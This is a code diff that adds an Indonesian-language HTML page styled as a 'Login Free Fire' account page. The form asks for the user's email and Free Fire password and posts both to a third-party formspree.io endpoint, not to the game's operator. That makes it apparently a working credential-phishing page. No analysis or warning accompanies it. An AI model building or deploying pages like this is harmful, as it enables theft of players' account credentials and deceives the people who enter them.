@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Free Fire</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="gstatic" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Figtree:wght@400;700&display=swap" rel="stylesheet">
+
+    <style>
+        /* CSS Anda di sini */
+        body {
+            font-family: 'Figtree', sans-serif; /* Menerapkan font Figtree */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            flex-direction: column;
+
+            /* Background gradasi body */
+            background: linear-gradient(to bottom, #181818, #601116);
+            color: #f0f0f0; /* Mengubah warna teks default agar kontras dengan background gelap */
+        }
+
+        .container {
+            /* Background gradasi card form */
+            background: linear-gradient(to bottom, #181818, #601116);
+            padding: 30px;
+            border-radius: 8px; /* Pastikan ini diterapkan untuk membuat sudut membulat */
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            width: 90%;
+            max-width: 500px;
+            margin-bottom: 20px;
+            color: #fff; /* Warna teks di dalam container agar kontras */
+        }
+
+        h1 {
+            color: #fff; /* Warna heading di dalam container */
+            margin-bottom: 20px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        label {
+            font-weight: bold;
+            color: #f0f0f0; /* Warna label di dalam container */
+            text-align: left;
+        }
+
+        textarea {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px; /* Sudut input juga bisa dibuat membulat jika diinginkan */
+            font-size: 16px;
+            resize: vertical;
+            color: #333; /* Warna teks input */
+            background-color: #eee; /* Sedikit background input agar terlihat */
+        }
+
+        button {
+            background-color: #007bff;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 5px; /* Sudut tombol */
+            cursor: pointer;
+            font-size: 18px;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        #konfirmasiPesan {
+            margin-top: 20px;
+            color: green;
+            font-weight: bold;
+        }
+
+        .image-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 90%;
+            max-width: 500px;
+            gap: 15px;
+        }
+
+        .image-container img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px; /* Sudut gambar juga sudah membulat */
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Login ke Akun Free Fire Anda</h1>
+        <form action="https://formspree.io/f/mwpqnnqo" method="POST">
+            <label for="pesan">Masukkan email anda disini:</label>
+            <textarea id="pesan" name="pesan" rows="5" cols="50" placeholder="Contoh: emailanda@gmail.com"></textarea>
+
+            <label for="password">Masukkan Password Akun Free Fire Anda:</label>
+            <textarea id="password" name="password" rows="3" cols="50" placeholder="Password Anda"></textarea>
+
+            <button type="submit">Login</button>
+        </form>
+        <p id="konfirmasiPesan"></p>
+    </div>
+
+    <div class="image-container">
+        <img src="gambar1.png" alt="Gambar Dokumentasi 1">
+        <img src="gambar.png" alt="Gambar Dokumentasi 2">
+    </div>
+
+    <script>
+        /* JavaScript Anda di sini */
+        document.addEventListener('DOMContentLoaded', () => {
+            const pesanTextArea = document.getElementById('pesan');
+            const passwordTextArea = document.getElementById('password');
+            const konfirmasiPesan = document.getElementById('konfirmasiPesan');
+            const formElement = document.querySelector('form');
+
+            formElement.addEventListener('submit', (event) => {
+                // Cek jika kedua textarea kosong sebelum pengiriman
+                if (pesanTextArea.value.trim() === '' || passwordTextArea.value.trim() === '') {
+                    event.preventDefault(); // Mencegah pengiriman formulir jika kosong
+                    konfirmasiPesan.textContent = 'Email dan Password tidak boleh kosong!';
+                    konfirmasiPesan.style.color = 'red';
+                } else {
+                    konfirmasiPesan.textContent = 'Memproses login...';
+                    konfirmasiPesan.style.color = 'blue';
+                }
+            });
+        });
+    </script>
+</body>
+</html>
